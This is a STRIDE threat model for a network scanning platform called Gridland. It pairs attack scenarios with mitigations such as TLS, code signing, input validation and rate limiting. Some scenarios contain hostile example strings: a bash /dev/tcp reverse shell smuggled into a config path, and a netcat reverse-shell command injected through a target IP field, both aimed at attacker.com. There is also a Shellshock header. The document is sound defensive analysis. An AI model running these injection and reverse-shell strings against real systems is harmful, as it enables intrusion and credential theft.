# Gridland Security - Formal Threat Model

This document outlines potential security threats to the Gridland security scanning platform, categorized using the STRIDE framework. The goal is to identify, assess, and propose mitigations for security risks across the entire application stack.

## 1. Spoofing

### 1.1. Manipulated Device Fingerprint

- **Threat Description:** An attacker in control of a target device can manipulate its service banners and responses to present a fake "fingerprint." For example, a hardened Linux server could be configured to mimic a vulnerable model of an IP camera.
- **Attack Scenario:** An analyst uses Gridland to scan a range of IPs on a client's network. One of these IPs is a server controlled by a malicious insider. The insider configures the server to return banners identical to a known-vulnerable camera. The Gridland `fingerprint_scanner` incorrectly identifies the server as this camera. The `onvif_scanner` and `stream_scanner` then run, launching thousands of useless, vendor-specific probes against the wrong target, wasting scan time and resources. More dangerously, a `vulnerability_scanner` might launch an exploit specific to the fake camera, which could crash a service on the attacker's server, making the Gridland tool appear unreliable or even destructive.
- **Impact Assessment:** Medium. This leads to inaccurate scan results, wasted resources, and a potential loss of confidence in the scanning tool. It does not directly compromise the Gridland server but undermines the integrity of its findings.
- **Proposed Mitigation:**
    - **Composite Fingerprinting:** Do not rely on a single data point (e.g., one banner). The fingerprinting logic should be enhanced to create a "confidence score" based on multiple factors (e.g., open ports, banner contents, HTTP header order, ONVIF response structure). A finding should be flagged as "low confidence" if the factors do not align.
    - **Behavioral Analysis:** The fingerprint scanner could perform a simple, non-intrusive behavioral check. For example, if a device claims to be an "Axis" camera, the scanner could check for the presence of a known Axis web page element before confirming the fingerprint.

### 1.2. Scan Result Injection via Man-in-the-Middle (MITM)

- **Threat Description:** The web interface retrieves scan results from the Flask server via an unencrypted HTTP API. There is no mechanism to ensure the integrity or authenticity of the results data being displayed to the user.
- **Attack Scenario:** An attacker is on the same local network as the security analyst using the Gridland web UI. The attacker performs a Man-in-the-Middle (MITM) attack, intercepting the JSON response from the Gridland server to the analyst's browser. The attacker modifies the JSON data in-flight, removing a "Critical" finding for an RCE vulnerability and altering a "High" finding for an information leak to "Low". The analyst, seeing the tampered results, incorrectly believes the target device is secure and fails to patch the critical vulnerability.
- **Impact Assessment:** High. This directly undermines the core purpose of the tool and can lead to a false sense of security, leaving critical vulnerabilities unpatched.
- **Proposed Mitigation:**
    - **Implement TLS:** The Flask server must be configured to serve all content over HTTPS. This will encrypt the data in transit, preventing an attacker from easily reading or modifying it.
    - **Digital Signatures (Optional but Recommended):** For very high-assurance environments, the server could generate a digital signature (e.g., using a JWT with an HMAC) for the results JSON. The frontend JavaScript could then verify this signature before rendering the results, ensuring they have not been tampered with.

## 2. Tampering

### 2.1. Unauthorized Modification of Scanner Plugins

- **Threat Description:** The scanner plugins are loaded dynamically from `.py` files in the `plugins/` directory. The application does not perform any integrity checks on these files before loading and executing them.
- **Attack Scenario:** An attacker gains low-privilege shell access to the Gridland server through an unrelated vulnerability (e.g., a weak SSH password on another service). The attacker does not have root access, but they have write permissions to the application directory. They modify `plugins/credential_scanner.py` and add a few lines of Python code that send any discovered credentials not only to the results database but also to a remote server under their control (`curl -d ...`). The next time an analyst runs a scan, the modified plugin executes, and the attacker silently exfiltrates valid credentials for high-value client systems.
- **Impact Assessment:** Critical. This allows for direct exfiltration of highly sensitive data (credentials for target systems) and can lead to a complete compromise of the networks being scanned.
- **Proposed Mitigation:**
    - **File Integrity Monitoring (FIM):** Implement a FIM system (like AIDE or Wazuh) on the server hosting Gridland. The system should be configured to monitor the `plugins/` directory and alert administrators immediately of any changes.
    - **Code Signing:** As a more robust solution, implement a code signing requirement for plugins. Before a plugin is loaded, the application would verify that its file has a valid digital signature from a trusted authority (the development team). If the signature is missing or invalid, the plugin is not loaded.
    - **Principle of Least Privilege:** Run the Gridland application under a dedicated, low-privilege user account that has read-only access to the `plugins/` directory. All application file permissions should be hardened.

### 2.2. Tampering with Scan Configuration at Rest

- **Threat Description:** Critical scan parameters, such as the paths for the discovery scanner, are stored in a world-readable and potentially world-writable YAML file (`data/discovery/paths.yml`).
- **Attack Scenario:** An attacker with local access to the server (as in the previous scenario) modifies the `data/discovery/paths.yml` file. They remove most of the legitimate paths and add a single new path under the `generic_admin_interface` category: `'/; /bin/bash -c "bash -i >& /dev/tcp/attacker.com/9999 0>&1"'`. The next time a scan is run, the `discovery_scanner` reads this malicious "path." While the scanner logic might not directly execute the command, a poorly sanitized component that uses this path (e.g., a logging or reporting function that calls a shell command) could be tricked into executing the payload, giving the attacker a reverse shell.
- **Impact Assessment:** High. This could lead to Remote Code Execution (RCE) on the Gridland server, depending on how other components process the configuration data. At a minimum, it allows an attacker to blind the scanner to real threats.
- **Proposed Mitigation:**
    - **Harden File Permissions:** The permissions for all configuration files should be hardened. They should be owned by the application's user and should not be writable by any other user on the system (`chmod 640`).
    - **Configuration Input Validation:** The application code that parses `paths.yml` must treat all input as untrusted. It should validate that each path is a valid, well-formed URL path and does not contain shell metacharacters or other malicious input.
    - **Environment Variables for Sensitive Config:** For any configuration that is highly sensitive or could influence execution flow, consider moving it out of flat files and into environment variables or a secure configuration management system (e.g., HashiCorp Vault).

## 3. Repudiation

### 3.1. Inability to Attribute Scans to a Specific User

- **Threat Description:** The application has no concept of user accounts or authentication for the web interface. Any individual with network access to the web server can launch a scan. This makes it impossible to prove who initiated a specific scan job.
- **Attack Scenario:** A disgruntled employee with access to the internal network uses the Gridland web UI to launch a highly aggressive scan against a sensitive production server, causing it to crash (a DoS). When the incident is investigated, the network traffic is traced back to the Gridland server. The employee, along with several other colleagues, denies having launched the scan. Because there are no user-specific logs, it is impossible to determine who was responsible, and the employee successfully evades accountability.
- **Impact Assessment:** High. This prevents effective incident response and accountability. In a professional setting, it could violate compliance requirements (e.g., PCI-DSS) that mandate user-specific accountability for security scanning activities.
- **Proposed Mitigation:**
    - **Implement Mandatory User Authentication:** Introduce a login system for the web interface. This could be a simple username/password system stored in a local database (with properly hashed passwords) or, preferably, integrated with a corporate identity provider like LDAP or an SSO solution (e.g., SAML, OIDC).
    - **Associate All Actions with a User:** Every action, especially launching a scan, must be tied to an authenticated user identity. The Job object in `lib/jobs.py` should be updated to include a `user_id` or `username` field.

### 3.2. Insufficient Logging for Forensic Analysis

- **Threat Description:** The application logs are focused on the *actions* of the scanners but lack crucial context about the *requestor*. Key details, such as the source IP address of the user accessing the web UI or the specific HTTP request that triggered a scan, are not logged.
- **Attack Scenario:** An external attacker gains a foothold on a single workstation inside the corporate network. From this workstation, they access the Gridland web UI and use it to launch scans against other internal network segments, effectively using Gridland as a pivot point for reconnaissance. When the activity is discovered, the logs show that scans were run, but they do not contain the source IP of the compromised workstation. Investigators cannot easily distinguish the attacker's actions from legitimate scans run by analysts, significantly slowing down the incident response process.
- **Impact Assessment:** Medium. The lack of forensic data makes it harder to investigate security incidents and understand the full scope of a breach.
- **Proposed Mitigation:**
    - **Enhanced Request Logging:** The Flask server should be configured with a middleware that logs detailed information for every incoming HTTP request. This should include the source IP address, User-Agent string, the requested URL, and the authenticated user (once implemented).
    - **Structured Logging:** Convert all log output to a structured format (e.g., JSON). This allows logs to be easily ingested, searched, and correlated in a central logging platform (e.g., an ELK stack or Splunk). Each log entry for a scan should contain a unique `job_id` and `user_id` to link it back to the originating request.

## 4. Information Disclosure

### 4.1. Leaking of Internal Paths and State via Debug Error Pages

- **Threat Description:** When the Flask application encounters an unhandled exception, it is configured to show a detailed debug error page. This page contains a full Python traceback, which reveals the absolute file paths of the source code (e.g., `/app/server.py`), snippets of the code itself, and the values of all local variables at the time of the crash.
- **Attack Scenario:** An attacker discovers that providing a malformed IP address (e.g., with non-ASCII characters) to the scan endpoint causes a crash deep within a library that doesn't expect it. The application returns a 500 error with the full Flask debug traceback. The attacker can now see the full directory structure of the application, the names of all loaded modules, and potentially sensitive data like configuration variables that were in memory. This gives them a detailed map of the application for planning a more targeted attack.
- **Impact Assessment:** High. This provides an attacker with a treasure trove of information about the application's inner workings, significantly lowering the bar for developing further exploits.
- **Proposed Mitigation:**
    - **Disable Debug Mode in Production:** The Flask application must *never* be run with `debug=True` in a production or production-like environment. This is the single most important fix.
    - **Custom Error Handlers:** Implement custom error handlers for common HTTP error codes (especially 500). These handlers should log the full exception details to a secure, backend log file (for developers to review) but only return a generic, non-informative error message to the user (e.g., "An internal server error occurred.").

### 4.2. Disclosure of Software Versions in HTTP Headers

- **Threat Description:** The HTTP responses sent by the web server include the `Server` header, which explicitly states the name and version of the web server software (e.g., `Server: Werkzeug/2.2.2 Python/3.11.2`).
- **Attack Scenario:** An attacker sends a single, simple HTTP request to the Gridland server. By inspecting the response headers, they immediately learn that the application is running on Werkzeug 2.2.2 and Python 3.11.2. The attacker can then consult a public vulnerability database (like CVE Details) to find all known vulnerabilities affecting that specific version of Werkzeug. This allows them to bypass the reconnaissance phase and move directly to attempting known exploits.
- **Impact Assessment:** Medium. While not a vulnerability in itself, it provides a clear roadmap for an attacker, making their job significantly easier and faster.
- **Proposed Mitigation:**
    - **Use a Production Web Server:** The Werkzeug development server should not be used for production. A production-grade server like Gunicorn or uWSGI should be used instead.
    - **Header Suppression:** Configure the production web server to suppress or modify the `Server` header. For example, in Nginx, this can be done with the `server_tokens off;` directive. The goal is to avoid giving away specific version information.

## 5. Denial of Service

### 5.1. Resource Exhaustion from Unconstrained Scans

- **Threat Description:** The application does not impose any limits on the size or scope of a scan that can be requested. A user can submit a scan for a massive IP range (e.g., a /8 CIDR block) with a large number of ports and a high thread count. This will cause the application to spawn an enormous number of threads and network connections.
- **Attack Scenario:** A malicious user accesses the web UI and launches a scan against `10.0.0.0/8` (over 16 million addresses) with all 685 ports enabled and the maximum number of threads. The Gridland server immediately attempts to spawn thousands of threads, consuming 100% of the CPU and all available memory. The server becomes completely unresponsive, legitimate scans fail, and the application may crash due to an out-of-memory error. The attack is simple to execute and highly effective.
- **Impact Assessment:** High. This allows a single user to make the entire scanning service unavailable for all other users.
- **Proposed Mitigation:**
    - **Implement Strict Rate Limiting and Quotas:** The application must enforce limits on scan requests. This should include:
        - A limit on the maximum size of a CIDR block that can be scanned at one time (e.g., no larger than a /22).
        - A limit on the number of concurrent jobs a single user (or source IP, if unauthenticated) can have running.
        - A global limit on the total number of active scan threads across the entire application.
    - **Job Queuing and Prioritization:** Implement a proper job queue (e.g., using Celery and Redis). Instead of launching scans immediately, new jobs are added to the queue. Worker processes can then pull jobs from the queue at a controlled rate, ensuring the server is never overwhelmed. This also allows for job prioritization (e.g., smaller scans run before larger ones).

### 5.2. Filesystem Exhaustion via Uncontrolled Logging

- **Threat Description:** The application writes detailed logs to the `logs/` directory for every scan. There is no mechanism for log rotation, compression, or cleanup.
- **Attack Scenario:** An attacker, over a period of several days, uses a script to launch thousands of small, targeted scans against a wide variety of ports. Each scan generates a new log file. The `logs/` directory slowly fills up with tens of thousands of files. Eventually, the filesystem partition where the application is stored runs out of space. This causes the Gridland application to crash when it next tries to write to a log file. Furthermore, it could crash the entire server if the root filesystem is full, affecting all other services.
- **Impact Assessment:** Medium. This can lead to application instability and eventual failure. The attack is slow but requires little sophistication.
- **Proposed Mitigation:**
    - **Implement Log Rotation:** Use a standard log rotation tool like `logrotate` to manage the application's log files. Logs should be rotated based on size (e.g., every 100MB) and/or time (e.g., daily).
    - **Automatic Cleanup:** Rotated logs should be compressed to save space and automatically deleted after a defined retention period (e.g., 30 days).
    - **Monitor Disk Space:** Implement monitoring and alerting for the server's filesystem. An administrator should be automatically notified if disk space on any critical partition drops below a certain threshold (e.g., 20% free).

## 6. Elevation of Privilege

### 6.1. Remote Code Execution via Plugin Command Injection

- **Threat Description:** A future or existing plugin could be developed to use external command-line tools to perform part of its scan. If the input passed to these external commands is not rigorously sanitized, an attacker could inject shell metacharacters and execute arbitrary commands on the Gridland server.
- **Attack Scenario:** A developer adds a new feature to the `vulnerability_scanner` to check for the "Shellshock" bash vulnerability. To do this, they make the plugin craft and execute a command like: `os.system(f"curl -H 'User-Agent: () {{ :; }}; echo VULNERABLE' {target.ip}")`. The developer assumes `target.ip` will always be a valid IP address. An attacker, knowing this, provides a malicious string as the target IP: `8.8.8.8; nc -e /bin/bash attacker.com 1234`. The application constructs and executes the command: `curl -H '...' 8.8.8.8; nc -e /bin/bash attacker.com 1234`. The curl command runs, and then the attacker's netcat command executes, giving them a reverse shell on the Gridland server, running with the privileges of the application user.
- **Impact Assessment:** Critical. This provides a direct path to Remote Code Execution (RCE) on the server.
- **Proposed Mitigation:**
    - **Avoid Shelling Out:** Never use `os.system()` or `subprocess.run(..., shell=True)`. When calling external commands, always use `subprocess.run()` with a list of arguments (e.g., `subprocess.run(['curl', '-H', user_agent, target_ip])`). This prevents the shell from interpreting metacharacters.
    - **Input Sanitization and Validation:** All input that will be used in a command-line argument must be strictly validated against a whitelist of allowed characters. For an IP address, this means ensuring it conforms to the IPv4 or IPv6 format and contains no other characters.
    - **Principle of Least Privilege:** If a plugin absolutely must run a command, it should be done within a sandboxed environment (e.g., a Docker container or a `chroot` jail) with minimal privileges and no network access, to limit the impact of a potential compromise.

### 6.2. Insecure Deserialization of Fingerprint Data

- **Threat Description:** The intelligence-led architecture relies on processing a `fingerprint` dictionary that is derived from data returned by a target device. While the current implementation only uses simple key-value pairs, a future enhancement might involve passing complex, serialized Python objects within this data structure for efficiency. If a library like `pickle` is used to deserialize this data, it could lead to RCE.
- **Attack Scenario:** A future developer decides to optimize the fingerprinting process. Instead of re-parsing banners every time, they modify the `fingerprint_scanner` to serialize a rich Python object (containing parsed data and methods) into a string using `pickle` and `base64`. This string is then passed in the `fingerprint` data. An attacker who controls a device being scanned can now send back their own malicious, base64-encoded `pickle` payload. When a downstream scanner receives this `fingerprint` and calls `pickle.loads()` on the malicious string, the payload executes, giving the attacker a shell on the Gridland server.
- **Impact Assessment:** Critical. Insecure deserialization of untrusted data is a classic and highly effective vector for RCE.
- **Proposed Mitigation:**
    - **Never Use `pickle` for Untrusted Data:** The `pickle` library is not secure and should never be used to deserialize data that originates from an untrusted source (which includes anything from a scanned target).
    - **Use Safe Serialization Formats:** For data interchange, always use a safe, data-only serialization format like JSON. JSON is designed to represent data, not code, and has no equivalent to `pickle`'s code execution capabilities.
    - **Data Transfer Objects (DTOs):** When passing data between components, use simple DTOs or dictionaries, not complex objects that might tempt a developer to use an unsafe serialization method.
